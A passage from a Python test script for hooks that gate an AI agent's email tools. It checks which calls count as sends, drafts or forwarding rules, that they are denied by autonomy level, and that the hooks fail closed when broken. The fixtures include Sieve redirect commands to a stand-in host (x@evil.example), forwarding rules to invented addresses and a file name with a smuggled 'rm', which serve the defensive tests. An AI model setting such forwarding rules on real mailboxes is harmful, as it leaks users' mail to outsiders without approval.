    bad = [a["note"] for a in INV["allow"]
           if ee.mail_tool_action(a["tool"], a["input"]) != a["expected"] or ee.mail_rule_forward(a["tool"], a["input"]) is not False]
    check("T5 T6: the plain draft file keys, the inert selector / auto-reply keys and the calendar prose stay allowed", not bad, f"{bad}")
    plain_mode = lambda v: ee._has_forward_key_name(v, True, False)
    files = [{"attachments": [{"filename": "fwd_invoice.pdf"}]}, {"attachments": ["/tmp/Fwd_ajanlat.pdf"]},
             {"attachments": [{"fileName": "Fwd_invoice.pdf"}]}, {"attachment": {"attachmentName": "Forwarded_invoice.pdf"}},
             {"attachments": {"files": [{"name": "fwd.pdf"}]}}]
    bare = [{"fileName": "Fwd_invoice.pdf"}, {"path": "Forwarded_invoice.pdf"}, {"filePath": "/tmp/redirect.txt"},
            {"attachmentPaths": ["fwd.pdf"]}, {"file": "fwd.pdf"}, {"files": ["fwd.pdf"]}, {"patch": [{"op": "add", "path": "/forwardTo"}]},
            {"attachments": [{"path": "/forwardTo"}]}, {"files": {"filename": "fwd.pdf"}}]
    check("T9 B2: attachment file names are exempt inside an attachment container of a plain draft only; a header value and a bare path / file key are not",
          all(not plain_mode(v) and strict(v) for v in files) and plain_mode({"headers": {"X-Tag": "fwd"}})
          and all(plain_mode(v) and strict(v) for v in bare))
    label_ex = mk_ex(name=("name", "displayname", "label", "labelname", "foldername", "title"))  # ea9215f6: the class exemption, passed in
    label_mode = lambda v: ee._has_forward_key_name(v, True, True, label_ex)
    check("T9 B1: a label / folder tool frees only the name keys, every other key keeps the strict word test, the forward KEY test stays",
          not label_mode({"name": "Forwarded", "displayName": "Forwarded Items", "label": "Fwd", "labelName": "Fwd", "folderName": "Fwd", "title": "redirect"})
          and label_mode({"parameters": {"command": "set forwarding to x"}}) and label_mode({"name": "x", "action": "redirect"})
          and label_mode({"name": "x", "forwardTo": "a"}) and label_mode({"name": {"forwardTo": "a"}}) and label_mode({"description": "Forwarded"})
          and not strict({"name": "x"}) and strict({"name": "Forwarded"}))
    check("T9 mailto: is a forward sign in strict mode only (outside the inert keys)",
          strict({"html": '<a href="mailto:a@b.hu">a</a>'}) and not plain_mode({"html": '<a href="mailto:a@b.hu">a</a>'})
          and strict({"x": "mailto:a@b.hu"}) and not plain_mode({"x": "mailto:a@b.hu"})
          and not ee._has_forward_key_name({"signature": "mailto:a@b.hu", "query": "mailto:"}, True, True, mk_ex(inert=("signature", "query")))
          and strict({"path": "mailto:a@b.hu"}))
    inert = {"query": "subject:Fwd", "q": "forward", "search": "Fwd", "keyword": "redirect", "keywords": ["forward"], "signature": "fwd",
             "responseBodyPlainText": "look forward", "responseBodyHtml": "forward", "internalReplyMessage": "forward",
             "externalReplyMessage": "redirect", "autoReplyMessage": "fwd", "label": "Forwarded", "folder": "Forwarded Items", "mailbox": "Forwarded"}
    all_ex = mk_ex(inert=("query", "q", "search", "keyword", "keywords", "signature", "responsebodyplaintext", "responsebodyhtml",
                          "internalreplymessage", "externalreplymessage", "autoreplymessage"),
                   name=("label", "folder", "mailbox"))  # ea9215f6: the keys are inert only where a tool class lists them
    check("T9 the keys a tool class lists are never word-tested (name keys: for a name-shaped value); a forwarding KEY under an inert or prose key is a forward in every mode",
          not ee._has_forward_key_name(inert, True, True, all_ex) and not ee._has_forward_key_name(inert, True, False, all_ex)
          and ee._has_forward_key_name({"query": '{"forwardTo":"x"}'}, True, True, all_ex) and plain_mode({"signature": {"forwardTo": "x"}})
          and plain_mode({"responseBodyPlainText": '{"redirectTo":"x"}'}))
    deep_v = {"a": 1}
    for _ in range(40):
        deep_v = {"n": deep_v}
    check("T9 the bounds still fail closed (depth, node count, a string too long to parse), in both modes",
          all(m(deep_v) and m({"l": list(range(6000))}) and m({"b": "{" + "a" * 100001}) and m("x") for m in (strict, plain_mode)))
    check("AC9: _has_forward_key counts mailto: as a forward sign", ee._has_forward_key({"action": {"notify": "mailto:"}}) is True
          and ee._has_forward_key({"criteria": {"subject": "invoice"}}) is False)

    # --- 1d. card ea9215f6 N1: every exemption belongs to a tool class ----------
    # 61fcac1e left a GLOBAL inert key set (label, folder, query, signature, ...): the be-n4r2 Sieve forms passed under those
    # keys on the Sieve / rule / settings tools. Now _has_forward_key_name takes the exemption from the caller (`ex`, three
    # key sets: inert always, name for a name-shaped value, file for a file-name-shaped value; none without it), the tool NAME
    # picks the class (_exemption_class), the name and file values must have their shape, and a plain draft is a positive grammar.
    # These checks are written ahead of the implementation (RED on 89ab0c72); the JS twin runs the same fixture rows in
    # src/__tests__/mail-tool-action-conformance.test.ts.
    print("class-bound exemptions")
    EXS = INV["exemption_segments"]
    got = [attempt(lambda r=r: ee._exemption_class(r["segments"], r["plain"])) for r in EXS]
    bad = [f"{r['segments']}: {g!r} != {r['expected']!r}" for r, g in zip(EXS, got) if g != r["expected"]]
    check(f"T2: _exemption_class names the class of {len(EXS)} tool-segment rows (plain, label, label-apply, move, msgop, reply, none)",
          len(EXS) >= 20 and {r["expected"] for r in EXS} == {"plain", "label", "label-apply", "move", "msgop", "reply", "none"} and not bad,
          f"{len(bad)} differ: {bad[:3]}")

    SC = INV["shape_cases"]
    got_n = attempt(lambda: [ee._NAME_SHAPE.fullmatch(c["value"]) is not None for c in SC])
    got_f = attempt(lambda: [ee._FILE_SHAPE.fullmatch(c["value"]) is not None for c in SC])
    check(f"T6: _NAME_SHAPE (a folder / label name, no @) matches the fixture on {len(SC)} values",
          got_n == [c["name"] for c in SC], f"{got_n!r}"[:200])
    check(f"T6: _FILE_SHAPE (a file name with a 1-10 character extension) matches the fixture on {len(SC)} values",
          got_f == [c["file"] for c in SC], f"{got_f!r}"[:200])

    forms = {f["label"]: f["text"] for f in INV["sieve_forms"]}
    reloc = [(t, {"name": "main", k: forms[fl]}, f"{t.split('__')[2]}/{k}/{fl}")
             for t in INV["relocation_tools"] for k in INV["relocation_keys"] for fl in INV["relocation_forms"]]
    reloc += [(r["tool"], dict(r["fixed"], **{r["key"]: forms[r["form"]]}), f"{r['tool'].split('__')[2]}/{r['key']}/{r['form']}")
              for r in INV["relocation_shape_rows"]]
    bad = [lab for t, i, lab in reloc if ee.mail_tool_action(t, i) != "send" or ee.mail_rule_forward(t, i) is not True]
    check(f"T5: {len(reloc)} calls (Sieve forms moved under the formerly global inert keys of the Sieve / rule / filter / B5 tools, "
          "and a form as a folder name) are a send and a rule-forward",
          len(reloc) == len(INV["relocation_tools"]) * len(INV["relocation_keys"]) * len(INV["relocation_forms"]) + len(INV["relocation_shape_rows"])
          and not bad, f"{len(bad)} differ: {bad[:5]}")

    # T7: _has_forward_key_name with the new `ex` argument
    no_ex = attempt(lambda: all(ee._has_forward_key_name(v, True, st) is True for st in (True, False) for v in (
        {"query": "fwd"}, {"signature": "fwd"}, {"label": "Forwarded"}, {"folder": "Forwarded Items"}, {"mailbox": "Fwd"},
        {"destination": "Forwarded"}, {"filePath": "/tmp/Fwd_ajanlat.pdf"}))
        and ee._has_forward_key_name({"responseBodyPlainText": "look forward", "autoReplyMessage": "fwd"}, True, True) is True)
    check("T7: without an `ex` argument no key is exempt (query, signature, label, folder, mailbox, destination, filePath; the reply text keys in strict mode)", no_ex is True, f"{no_ex!r}")
    hk7 = lambda v, st, ex: ee._has_forward_key_name(v, True, st, ex)
    inert_ex = mk_ex(inert=("query", "signature"))
    check("T7: an inert key is never word-tested, in either mode; only the listed keys",
          attempt(lambda: not hk7({"query": "subject:Fwd", "signature": "mailto:a@b.hu"}, True, inert_ex)
                  and not hk7({"query": "subject:Fwd"}, False, inert_ex)
                  and hk7({"q": "fwd"}, True, inert_ex) and hk7({"label": "Forwarded"}, True, inert_ex)
                  and hk7({"query": '{"forwardTo":"x"}'}, True, inert_ex)) is True)
    name_ex = mk_ex(name=("label", "folder", "name", "title"))
    check("T7: a name key frees a folder-name-shaped value (a list too); a Sieve command, a ; : \" or an @ value, other keys and a forward KEY still deny",
          attempt(lambda: not hk7({"label": "Forwarded", "folder": "Forwarded Items", "name": "Fwd", "title": "redirect"}, True, name_ex)
                  and not hk7({"label": ["Forwarded", "Fwd"]}, True, name_ex)
                  and hk7({"label": 'redirect :copy "x@evil.example";'}, True, name_ex) and hk7({"label": "forward to x@evil.example"}, True, name_ex)
                  and hk7({"folder": "Forwarded;"}, True, name_ex) and hk7({"label": ["Forwarded", "redirect;"]}, True, name_ex)
                  and hk7({"description": "Forwarded"}, True, name_ex) and hk7({"other": "Forwarded"}, True, name_ex)
                  and hk7({"label": {"forwardTo": "a"}}, True, name_ex)) is True)
    file_ex = mk_ex(file=("filepath", "attachmentpaths"))
    check("T7: a file key frees a file-name-shaped value in both modes; /forwardTo, a value with no extension and other file keys still deny",
          attempt(lambda: not hk7({"filePath": "/tmp/Fwd_ajanlat.pdf"}, True, file_ex) and not hk7({"filePath": "/tmp/Fwd_ajanlat.pdf"}, False, file_ex)
                  and not hk7({"attachmentPaths": ["/tmp/Fwd_ajanlat.pdf", "fwd.pdf"]}, True, file_ex)
                  and hk7({"filePath": "/forwardTo"}, True, file_ex) and hk7({"attachmentPaths": ["/tmp/ok.pdf", "/forwardTo"]}, True, file_ex)
                  and hk7({"fileName": "Fwd_invoice.pdf"}, True, file_ex) and hk7({"filePath": "fwd.pdf; rm"}, True, file_ex)) is True)
    all3 = mk_ex(inert=("a",), name=("b",), file=("c",))

    def deep_nest():
        d = {"a": 1}
        for _ in range(40):
            d = {"n": d}
        return d
    check("T7: a forwarding KEY under every exempt key set, and the bounds (depth, node count, string length, non-container), deny whatever `ex` says",
          attempt(lambda: all(hk7({k: {"forwardTo": "x"}}, st, all3) and hk7({k: {"redirectTo": 1}}, st, all3) for k in ("a", "b", "c") for st in (True, False))
                  and all(hk7(v, st, all3) for st in (True, False) for v in (
                      deep_nest(), {"l": list(range(6000))}, {"b": "{" + "a" * 100001}, "x", None))) is True)
    # the main agent's gates, measured on a disposable store (card 3d6e5181 N3, R5): the approval gate
    # puts a forwarding rule behind the autonomy level (level 1 denies, level 3 passes, like any send), a
    # reader and a clean rule pass; the copy gate has no text to inspect on a rule, so it denies a forwarding
    # rule at EVERY level (fail-closed: the main agent cannot set a forwarding rule through an MCP tool).
    fwd_t, fwd_i = "mcp__outlook__manage_rules", {"rules": [{"actions": {"forwardTo": ["invented@example.com"]}}]}
    with tempfile.TemporaryDirectory() as td_ni:
        for level, want_approval in ((1, 2), (3, 0)):
            st = make_store(os.path.join(td_ni, f"l{level}"), level)
            code, _, _ = run(GATE, st, fwd_t, fwd_i)
            check(f"approval gate level {level}: forwarding rule exit {want_approval}", code == want_approval, f"exit={code}")
            code, _, _ = run(COPY, st, fwd_t, fwd_i)
            check(f"copy gate level {level}: forwarding rule is denied (no text to inspect)", code == 2, f"exit={code}")
        st = make_store(os.path.join(td_ni, "l1b"), 1)
        # card 1239a7ad: a reader passes while its input has no forward KEY; with one it is a send like any other
        for tool, ti, label in (("mcp__outlook__list_rules", {"query": "forward"}, "reader (forward word in a value)"),
                                ("mcp__outlook__manage_rules", {"rules": [{"actions": {"moveToFolder": "F1"}}]}, "clean rule")):
            for script in (GATE, COPY):
                code, _, _ = run(script, st, tool, ti)
                check(f"{os.path.basename(script)} level 1: {label} passes", code == 0, f"exit={code}")
        for script in (GATE, COPY):
            code, _, _ = run(script, st, "mcp__outlook__list_rules", {"forwardTo": "x"})
            check(f"{os.path.basename(script)} level 1: a reader with a forward KEY is denied like any send (card 1239a7ad)", code == 2, f"exit={code}")

    # --- 2. the call forms the pinned helper and the golden use (G6) ----------
    print("call forms")
    legacy = gate._SEND_TOOL.search("mcp__claude_ai_Gmail__reply")
    check("_SEND_TOOL.search on a listed name still returns the regex match",
          isinstance(legacy, re.Match) and legacy.group(0) == "Gmail__reply", repr(legacy))
    check("_SEND_TOOL.search on v2_send_draft is truthy", bool(gate._SEND_TOOL.search("mcp__gmail-v2__v2_send_draft")))
    for tool in ("Bash", "mcp__gmail__search_emails", "mcp__gmail-v2__v2_draft_email",
                 "mcp__plugin_telegram_telegram__reply", "Read", ""):
        check(f"_SEND_TOOL.search({tool!r}) is falsy", not gate._SEND_TOOL.search(tool))
    check("_SEND_TOOL.search on a manage_email name is the legacy match (the operation decides later)",
          isinstance(gate._SEND_TOOL.search("mcp__google-workspace__manage_email"), re.Match))
    check("CONNECTOR_SEND_RE is the unchanged compiled pattern",
          isinstance(ee.CONNECTOR_SEND_RE, re.Pattern)
          and ee.CONNECTOR_SEND_RE.pattern == r"gmail__(reply|reply_all|send_message|forward)$"
          and ee.CONNECTOR_SEND_RE.flags & re.I)

    # --- 3. every case through both python gates -----------------------------
    print("gates, per case")
    s1 = make_store(os.path.join(td, "l1"), 1)
    s3 = make_store(os.path.join(td, "l3"), 3)
    for c in CASES:
        tool, ti, exp = c["tool"], c["input"], c["expected"]
        code, _, err = run(GATE, s1, tool, ti)
        if exp == "send":
            check(f"approval gate L1: {tool} is a send, DENIED", code == 2 and "szint 1" in err,
                  f"exit={code} err={err[:160]!r}")
        elif tool in STRICTER_THAN_VECTOR:
            # Brainy 4952: the name classifier merged from v1.45.0 ranks a "...reply" on a gmail server as
            # a send, so level 1 denies it. That blocks MORE than the vector's 'draft' class (which passes),
            # never less, so the expectation is the denial.
            check(f"approval gate L1: {tool} is ranked a send by name (stricter than the vector), DENIED",
                  code == 2 and "szint 1" in err, f"exit={code} err={err[:160]!r}")
        else:
            check(f"approval gate L1: {tool} is not a send, passes", code == 0, f"exit={code} err={err[:160]!r}")
        code, _, err = run(GATE, s3, tool, ti)
        check(f"approval gate L3: {tool} passes", code == 0, f"exit={code} err={err[:160]!r}")

        code, _, err = run(COPY, s1, tool, ti)
        want = 2 if (exp == "send" and not has_text(ti)) else 0
        check(f"copy gate as-is: {tool} -> exit {want}", code == want, f"exit={code} err={err[:160]!r}")
        if not is_channel(tool):
            probe = dict(ti)
            probe["body"] = str(probe.get("body") or "") + " Próba " + EM_DASH + " vége."
            code, _, err = run(COPY, s1, tool, probe)
            want = 2 if exp in ("send", "draft") else 0
            check(f"copy gate em-dash probe: {tool} {'audited' if want else 'not audited'} (exit {want})",
                  code == want, f"exit={code} err={err[:160]!r}")

    # A draft verb also names label, filter and settings calls (spec G2: update/save). They
    # carry no text of ours: no approval, no copy block, as before N1b. Since card 6151bb4d
    # create_label / create_filter are not drafts at all (create needs a mail noun); update_label
    # still rides the draft path.
    for tool, ti, draft in (("mcp__gmail__create_label", {"name": "Ügyfél — fontos"}, False),
                            ("mcp__gmail-v2__v2_update_label", {"id": "L1", "name": "Ajánlat"}, True),
                            ("mcp__gmail__create_filter", {"criteria": {"subject": "invoice"}, "action": {"addLabelIds": ["L1"]}}, False)):
        got = ee.mail_tool_action(tool, ti)
        check(f"{tool} is {'on the draft path' if draft else 'not a draft (card 6151bb4d)'}",
              got == ("draft" if draft else None), f"got {got!r}")
        code, _, err = run(GATE, s1, tool, ti)
        check(f"approval gate L1: {tool} passes", code == 0, f"exit={code} err={err[:160]!r}")
        code, _, err = run(COPY, s1, tool, ti)
        check(f"copy gate: {tool} with no text of ours passes untouched", code == 0, f"exit={code} err={err[:160]!r}")

    # card 6151bb4d r2 B2: a forwarding rule is a send for the approval gate (no approval -> exit 2)
    for tool in ("mcp__gmail__create_filter", "mcp__ms365__create-rule", "mcp__gmail__set_rule"):
        code, _, err = run(GATE, s1, tool, {"actions": {"forwardTo": "x@y.hu"}})
        check(f"approval gate: {tool} with forwarding input needs an approval (exit 2)", code == 2, f"exit={code} err={err[:160]!r}")
        code, _, err = run(GATE, s1, tool, {"actions": {"markAsRead": True}})
        check(f"approval gate: {tool} with a clean input passes (exit 0)", code == 0, f"exit={code} err={err[:160]!r}")

    # --- 3b. manage_email operations (card 2f835ee4 r5, AC1-AC7) ---------------
    print("manage_email operations")
    OPS = VECTORS["manage_email_ops"]
    ME = "mcp__google-workspace__manage_email"
    check("the manage_email_ops block has >= 20 rows, outbound and not", len(OPS) >= 20
          and {r["outbound"] for r in OPS} == {True, False})
    for r in OPS:
        got = ee.manage_email_op_outbound(r["op"])
        check(f"function: {r['op']!r} -> outbound={r['outbound']} ({r['note']})", got is r["outbound"], f"got {got!r}")
        closed = r.get("closed", r["outbound"])
        got = ee.manage_email_op_closed(r["op"])
        check(f"function: {r['op']!r} -> closed={closed} (card d8d3441e)", got is closed, f"got {got!r}")
    check("the manage_email_ops block pins closed true and false, non-strings included",
          {r.get("closed", r["outbound"]) for r in OPS} == {True, False}
          and {"null", "list", "int"} <= {type(r["op"]).__name__.replace("NoneType", "null") for r in OPS})
    for v in (None, 123, ["send"], {"op": "send"}, True, b"send"):
        check(f"function: a non-string operation {v!r} is not outbound and does not raise",
              ee.manage_email_op_outbound(v) is False)
    check("the key drops - and _, strips ASCII whitespace only, lower-cases ASCII only",
          ee.manage_email_op_key(" Re-Ply_ALL\t") == "replyall"
          and ee.manage_email_op_key(NBSP + "send") == NBSP + "send" and ee.manage_email_op_key(DOTTED_I) == DOTTED_I)

    # The gates, row by row. The oracles are the PRE-r5 tests spelled out here (AC3: never narrower):
    # the approval gate lower-cased, stripped, mapped "-" to "_" and took a missing or blank
    # operation for a send; the copy gate stripped and lower-cased.
    pre_approval = {"send", "reply", "reply_all", "replyall", "forward"}
    pre_copy = {"send", "reply", "replyall", "forward"}
    for r in OPS:
        op = r["op"]
        isstr = isinstance(op, str)
        closed = r.get("closed", r["outbound"])
        code, _, err = run(GATE, s1, ME, {"operation": op, "to": ["a@b.hu"], "body": "Kedves Ügyfelünk! Törzs."})
        want = closed or (isstr and (op.strip().lower().replace("-", "_") in pre_approval or not op.strip()))
        check(f"approval gate L1: operation {op!r} -> {'DENIED' if want else 'passes'}",
              (code == 2 and "szint 1" in err) if want else code == 0, f"exit={code} err={err[:120]!r}")
        code, _, err = run(COPY, s1, ME, {"operation": op, "body": "Szia " + EM_DASH + " vége."})
        want = closed or (isstr and op.strip().lower() in pre_copy)
        check(f"copy gate: operation {op!r} -> {'audited (exit 2)' if want else 'not audited (exit 0)'}",
              code == (2 if want else 0), f"exit={code} err={err[:120]!r}")
    # AC5: the draft flag is honoured for the new alias exactly as for reply.
    for op in ("reply", "reply_all", "REPLY-ALL"):
        code, _, err = run(GATE, s1, ME, {"operation": op, "draft": True, "body": "Törzs."})
        check(f"approval gate L1: {op!r} with draft:true passes (a draft puts nothing on the wire)", code == 0,
              f"exit={code} err={err[:120]!r}")
        code, _, err = run(GATE, s1, ME, {"operation": op, "draft": "yes", "body": "Törzs."})
        check(f"approval gate L1: {op!r} with draft:'yes' is still a send", code == 2 and "szint 1" in err,
              f"exit={code}")
    # A missing or non-string operation keeps the approval gate's policy (a send) and never crashes a gate.
    for v in (None, 123, ["reply_all"], {}, True):
        code, _, err = run(GATE, s1, ME, {"operation": v, "body": "Törzs."})
        check(f"approval gate L1: operation {v!r} is taken for a send, as before", code == 2 and "szint 1" in err,
              f"exit={code}")
        code, _, err = run(COPY, s1, ME, {"operation": v, "body": "Szia " + EM_DASH + " vége."})
        check(f"copy gate: operation {v!r} is closed, so audited (exit 2, card d8d3441e)", code == 2,
              f"exit={code} err={err[:120]!r}")
    code, _, err = run(GATE, s1, ME, {"body": "Törzs."})
    check("approval gate L1: no operation key at all is taken for a send, as before",
          code == 2 and "szint 1" in err, f"exit={code}")
    code, _, err = run(COPY, s1, ME, {"body": "Szia " + EM_DASH + " vége."})
    check("copy gate: no operation key at all is closed, so audited (exit 2, card d8d3441e)", code == 2,
          f"exit={code} err={err[:120]!r}")
    code, _, err = run(COPY, s1, ME, {"operation": ["send"], "action": "search", "body": "Szia " + EM_DASH + " vége."})
    check("copy gate: a non-string operation is not rescued by a readable `action` (exit 2)", code == 2,
          f"exit={code}")
    code, _, err = run(COPY, s1, ME, {"action": "reply_all", "body": "Szia " + EM_DASH + " vége."})
    check("copy gate: the `action` key is read like `operation` (exit 2)", code == 2, f"exit={code}")

    # --- 4. G5: envelope and anchor at level 2 --------------------------------
    print("G5")
    s2 = make_store(os.path.join(td, "g5"), 2)
    for tool, ti, label in (
            ("mcp__gmail-v2__v2_send_draft", {"draftId": "draft-7"}, "v2_send_draft by draftId"),
            ("mcp__x_gmail__sendDraft", {"draftId": "draft-7"}, "sendDraft by draftId"),
            ("mcp__gmail-v2__v2_send_draft", {"draftId": "draft-7", "to": ["a@b.hu"], "body": "Kedves Ügyfelünk! Ez nem a piszkozat."},
             "v2_send_draft with a body in the call: the draft goes out, not the body"),
            ("mcp__gmail-v2__v2_send", {"draft_id": "draft-7", "to": ["a@b.hu"], "body": "Kedves Ügyfelünk! Törzs."},
             "a draft id in the input, whatever the key spelling"),
            ("mcp__gmail-v2__v2_forward", {"messageId": "msg-42", "to": ["a@b.hu"]}, "v2_forward with no text")):
        code, _, err = run(GATE, s2, tool, ti)
        # v2_forward is a connector send by NAME in v1.45.0, so its text-less call is refused by the
        # name path's own reason ("nem nyerheto ki level-szoveg") instead of the stored-content one.
        # Same strength: exit 2 and no anchor offered (c3c32903, tests); the other four keep the wording.
        wording = ("nem horgonyozhato", "nem nyerheto ki level-szoveg") if tool.endswith("v2_forward") else ("nem horgonyozhato",)
        check(f"L2: {label} -> DENIED, nem horgonyozhato", code == 2 and any(w in err for w in wording)
              and anchor_from(err) is None, f"exit={code} err={err[:200]!r}")
    env = ee.collect_email_envelope("mcp__gmail-v2__v2_send_draft", {"draftId": "draft-7"})
    check("envelope of v2_send_draft names the stored draft", "piszkozat" in (env["unreadable_reason"] or ""), repr(env))

    reply_text = "Kedves Ügyfelünk! Válasz."
    reply = {"messageId": "msg-42", "body": reply_text}
    want_anchor = hand_anchor(["messageId:msg-42"], reply_text)
    sa = make_store(os.path.join(td, "g5-reply"), 2)
    code, _, err = run(GATE, sa, "mcp__gmail-v2__v2_reply_all", reply)
    check("L2: v2_reply_all without approval -> DENIED with the messageId anchor (hand-computed)",
          code == 2 and anchor_from(err) == want_anchor, f"exit={code} anchor={anchor_from(err)} want={want_anchor}")
    approve(sa, want_anchor)
    code, out, err = run(GATE, sa, "mcp__gmail-v2__v2_reply_all", reply)
    check("L2: v2_reply_all with the matching approval -> ALLOWED", code == 0, f"exit={code} err={err[:160]!r}")
    code, _, err = run(GATE, sa, "mcp__gmail-v2__v2_reply_all", reply)
    check("L2: the same reply again -> DENIED (one-shot)", code == 2, f"exit={code}")
    sb = make_store(os.path.join(td, "g5-other"), 2)
    approve(sb, want_anchor)
    code, _, err = run(GATE, sb, "mcp__gmail-v2__v2_reply_all", {"messageId": "msg-43", "body": reply_text})
    check("L2: the approval for msg-42 does not answer msg-43", code == 2 and anchor_from(err) != want_anchor,
          f"exit={code}")

    # --- 5. the pinned helper (scripts/approval-envelope.py, not modified) -----
    print("approval-envelope.py helper")
    # The helper exists only where the approval-envelope local patch is applied
    # (live tree); develop does not ship it, so there the section is skipped, not failed.
    if not os.path.exists(HELPER):
        print("  [SKIP] scripts/approval-envelope.py not present in this tree (live-tree-only helper)")
    else:
        today = {"to": ["a@b.hu"], "subject": "Teszt tárgy", "body": "Kedves Ügyfelünk! Törzs."}
        code, out, err = run_helper("mcp__server-gmail-autoauth-mcp__send_email", today)
        try:
            body = json.loads(out)
        except ValueError:
            body = {}
        check("helper: today's send still builds its request (exit 0, hand-computed hash)",
              code == 0 and body.get("content_hash") == hand_anchor(["a@b.hu"], "Kedves Ügyfelünk! Törzs.\nTeszt tárgy")
              and body.get("category") == "email_send", f"exit={code} err={err[:160]!r}")
        code, out, err = run_helper("mcp__gmail-v2__v2_send_draft", {"draftId": "draft-7"})
        check("helper: v2_send_draft -> exit 2, empty stdout", code == 2 and out == "", f"exit={code} out={out[:80]!r}")
        code, out, err = run_helper("mcp__gmail-v2__v2_reply_all", reply)
        try:
            body = json.loads(out)
        except ValueError:
            body = {}
        check("helper: v2_reply_all gets the same anchor the gate asks for",
              code == 0 and body.get("content_hash") == want_anchor, f"exit={code} err={err[:160]!r}")

    # --- 6. fail-closed on a disposable copy ----------------------------------
    print("fail-closed (disposable copies)")

    def copy_tree(dst):
        skip = shutil.ignore_patterns("__pycache__")
        shutil.copytree(HOOKS, os.path.join(dst, "scripts", "hooks"), ignore=skip)
        shutil.copytree(os.path.join(ROOT, "scripts", "lib"), os.path.join(dst, "scripts", "lib"), ignore=skip)
        return (os.path.join(dst, "scripts", "hooks", "email-approval-gate.py"),
                os.path.join(dst, "scripts", "hooks", "outgoing-copy-gate.py"),
                os.path.join(dst, "scripts", "hooks", "email_extract.py"))

    send_draft = ("mcp__gmail-v2__v2_send_draft", {"draftId": "draft-7"})
    search = ("mcp__gmail__search_emails", {"query": "x"})
    tg = ("mcp__plugin_telegram_telegram__reply", {"chat_id": "1", "text": "Szia, köszönöm."})
    ls = ("Bash", {"command": "ls -la"})
    bash_send = ("Bash", {"command": 'sendmail --to a@b.hu --subject "Bash tárgy" --body "Kedves Ügyfelünk! Törzs."'})

    g_ok, c_ok, _ = copy_tree(os.path.join(td, "intact"))
    for label, (tool, ti) in (("v2_send_draft", send_draft), ("search_emails", search), ("Bash ls", ls)):
        real = run(GATE, s2, tool, ti)[0], run(COPY, s1, tool, ti)[0]
        cp = run(g_ok, s2, tool, ti)[0], run(c_ok, s1, tool, ti)[0]
        check(f"control: the intact copy decides like the real gates ({label})", real == cp, f"real={real} copy={cp}")

    g_br, c_br, x_br = copy_tree(os.path.join(td, "broken"))
    with open(x_br, "a", encoding="utf-8") as fh:
        fh.write("<" * 7 + " Updated upstream\n")
    code, _, err = run(g_br, s2, *send_draft)
    check("broken email_extract: approval gate L2 denies v2_send_draft (exit 2) naming the module",
          code == 2 and "email_extract.py" in err, f"exit={code} err={err[:160]!r}")
    code, _, err = run(g_br, s2, *search)
    check("broken email_extract: approval gate L2 cannot classify search_emails -> denies (exit 2)",
          code == 2, f"exit={code}")
    code, _, _ = run(g_br, s2, *ls)
    check("broken email_extract: approval gate passes a non-send Bash as before", code == 0, f"exit={code}")
    code, _, _ = run(c_br, s1, *send_draft)
    check("broken email_extract: copy gate denies v2_send_draft", code == 2, f"exit={code}")
    code, _, _ = run(c_br, s1, *search)
    check("broken email_extract: copy gate cannot classify search_emails -> denies", code == 2, f"exit={code}")
    code, _, _ = run(c_br, s1, *tg)
    check("broken email_extract: the Telegram reply path is untouched (exit 0)", code == 0, f"exit={code}")

    g_old, c_old, x_old = copy_tree(os.path.join(td, "old"))
    with open(x_old, encoding="utf-8") as fh:
        src = fh.read()
    # An email_extract.py from before N1b: no classifier, and no branch that calls it.
    src2 = (src.replace("def mail_tool_action(", "def _gone_mail_tool_action(")
               .replace('elif mail_tool_action(tool_name, tool_input) == "send":', "elif False:"))
    with open(x_old, "w", encoding="utf-8") as fh:
        fh.write(src2)
    check("old-module copy really lacks mail_tool_action",
          src2 != src and re.search(r"(?<!\w)mail_tool_action\(", src2) is None)
    code, _, err = run(g_old, s2, *send_draft)
    check("email_extract without the classifier: approval gate L2 denies v2_send_draft", code == 2, f"exit={code}")
    code, _, _ = run(c_old, s1, *send_draft)
    check("email_extract without the classifier: copy gate denies v2_send_draft", code == 2, f"exit={code}")
    code, _, err = run(c_old, s1, *bash_send)
    check("email_extract without the classifier: a clean Bash send is still read and passes the copy gate",
          code == 0, f"exit={code} err={err[:160]!r}")

    # --- 7. manage_email_op_outbound missing or broken (card 2f835ee4 r5, AC6) --
    print("manage_email fail-closed (disposable copies)")
    g_nf, c_nf, x_nf = copy_tree(os.path.join(td, "old-me"))
    with open(x_nf, encoding="utf-8") as fh:
        src = fh.read()
    # A module that predates the feature has neither the outbound nor the closed rule.
    src3 = (src.replace("def manage_email_op_outbound(", "def _gone_manage_email_op_outbound(")
               .replace("def manage_email_op_closed(", "def _gone_manage_email_op_closed("))
    with open(x_nf, "w", encoding="utf-8") as fh:
        fh.write(src3)
    check("old-module copy really lacks manage_email_op_outbound",
          src3 != src and re.search(r"(?<!\w)def manage_email_op_outbound\(", src3) is None)
    reply_all = {"operation": "reply_all", "body": "Kedves Ügyfelünk! Törzs."}
    code, _, err = run(g_nf, s1, ME, reply_all)
    check("no shared op function: approval gate L1 still denies reply_all (local pre-r5 set)",
          code == 2 and "szint 1" in err, f"exit={code} err={err[:120]!r}")
    code, _, err = run(g_nf, s1, ME, {"operation": "search", "query": "x"})
    check("no shared op function: approval gate L1 still lets a search through", code == 0, f"exit={code}")
    code, _, err = run(g_nf, s1, ME, {"operation": "re_ply_all", "body": "Törzs."})
    check("no shared op function: approval gate falls back to the pre-r5 set (re_ply_all is not in it, exit 0)",
          code == 0, f"exit={code}")
    code, _, err = run(c_nf, s1, ME, {"operation": "reply_all", "body": "Szia " + EM_DASH + " vége."})
    check("no shared op function: copy gate counts every non-empty operation outbound (exit 2)", code == 2, f"exit={code}")
    code, _, err = run(c_nf, s1, ME, {"operation": "search", "query": "x"})
    check("no shared op function: copy gate, even a search blocks (the stub is closed, exit 2)", code == 2, f"exit={code}")
    code, _, err = run(c_nf, s1, ME, {"operation": "", "body": "x"})
    check("no shared op function: copy gate, an empty operation with a clean body passes (exit 0)", code == 0, f"exit={code}")
    # Control, so the line above is the stub and not the gate: the intact copy lets a search through.
    code, _, err = run(c_ok, s1, ME, {"operation": "search", "query": "x"})
    check("control: the intact copy lets a search through the copy gate (exit 0)", code == 0, f"exit={code}")
    code, _, err = run(g_br, s1, ME, reply_all)
    check("broken email_extract: approval gate L1 denies reply_all (exit 2)", code == 2, f"exit={code}")

    # --- card 5e3c31c5 N0: bare NaN / Infinity / -Infinity in a walked JSON string -------------------
    # Python json.loads accepts the literals, so the three walkers walk the string; the JS twin must walk it too
    # (src/__tests__/mail-tool-action-conformance.test.ts runs the same rows). Python is the reference here.
    print("walker JSON strings with NaN / Infinity (card 5e3c31c5)")
    WJ = NI["walker_json"]
    walker_fns = {
        "hasForwardKey": lambda v: ee._has_forward_key(v),
